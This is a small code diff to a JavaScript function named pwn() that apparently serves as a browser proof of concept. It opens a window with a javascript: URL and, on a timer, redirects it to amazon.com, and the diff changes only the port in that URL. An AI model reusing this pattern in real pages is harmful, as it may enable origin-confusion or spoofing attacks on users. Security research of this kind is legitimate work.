@@ -11,7 +11,7 @@
     function pwn() {
         v = setInterval(`x=window.open("javascript:document.write(1)")`);
         i = setInterval(`
-            x.document.location = "https://www.amazon.com:1234"
+            x.document.location = "https://www.amazon.com"
             clearInterval(v);
             clearInterval(i);
             `, 3333);        
